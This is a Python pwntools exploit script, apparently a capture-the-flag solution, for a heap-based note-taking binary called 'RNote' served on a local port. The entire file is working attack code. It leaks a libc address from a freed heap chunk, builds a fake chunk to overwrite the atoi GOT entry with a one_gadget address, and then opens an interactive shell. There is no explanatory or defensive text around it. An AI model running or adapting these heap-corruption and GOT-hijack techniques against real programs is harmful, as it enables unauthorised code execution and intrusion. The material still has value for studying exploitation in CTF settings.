#!/usr/bin/env python2
from pwn import *
from IPython import embed

#p = process('./RNote')
p = remote('127.0.0.1', 7122)

def recv(s):
	print 'waiting', s
	p.recvuntil(s)

def menu():
	recv('choice:')

def add(size, title, content, r=True):
	if r: menu()
	p.sendline('1')
	recv('size:')
	p.sendline(str(size))
	recv('title:')
	if len(title) < 17:
		p.sendline(title)
	else:
		p.send(title)
	recv('content:')
	p.send(content)
	sleep(0.1)

def dele(index, r=True):
	if r: menu()
	p.sendline('2')
	recv('delete:')
	p.sendline(str(index))

def show(index, r=True):
	if r: menu()
	p.sendline('3')
	recv('show:')
	p.sendline(str(index))
	recv('title:')
	title = p.recvline()
	recv('content:')
	content = p.recvline()
	return title, content

def ex(r=True):
	if r: menu()
	p.sendline('4')

# leak libc
sz = 128
add(sz, '1', 'a'*sz)
add(sz, '1', 'b'*sz)
dele(0)
add(sz, '1', 'A')
tt, ct = show(0, False)
libc_heap = u64(ct[9:17])
print hex(libc_heap)
heap_offset = 0x7f71f6472b78-0x7f71f60af000
libc = libc_heap - heap_offset
print hex(heap_offset), heap_offset
print hex(libc)
dele(0)
dele(1)

# got hijack
def note_ptr(i):
	return 0x6020e0  + 32*i + 24

got_atoi = 0x602068
one_gadget = 0xcc543
add(128, '1', 'A'*128)
add(16, '3'*16+'\x20', 'c'*16)
add(16, '3'*16+'\x40', 'c'*16)
dele(0)
add(128, '1', flat(0,
				   0x21,
				   0x7122,
				   0x7122,
				   0x20,
				   -8,
				   got_atoi-24, 
				   libc+one_gadget,
				   #0,
				   #0x21,
				   #0xbeef,
				   #0xbeef,
				   word_size=64).ljust(128, 'a'))
#add(8, '2'*16+'\x1f', 'b'*8)
#add(8, '3'*16+'\x2f', 'c'*8)
print hex(libc+one_gadget)
p.interactive()
dele(1, False)
p.interactive()

